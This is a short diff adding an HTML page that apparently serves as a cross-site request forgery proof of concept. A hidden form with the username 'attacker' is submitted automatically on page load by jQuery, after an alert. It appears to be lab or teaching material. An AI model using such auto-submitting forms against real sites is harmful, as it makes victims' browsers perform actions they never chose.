@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+</head>
+<body>
+	<form method = "post" name = "myform" id = "myform">
+		<input type = "hidden" name = "username" value = "attacker">
+		<input type = "submit" name = "submit" id = "submit" style="display:none;">
+	</form>
+
+	<script>
+		$(document).ready(function(){
+			alert("submitting form...");
+			$("#myform").submit();	
+		});
+	</script>
+</body>
+</html>
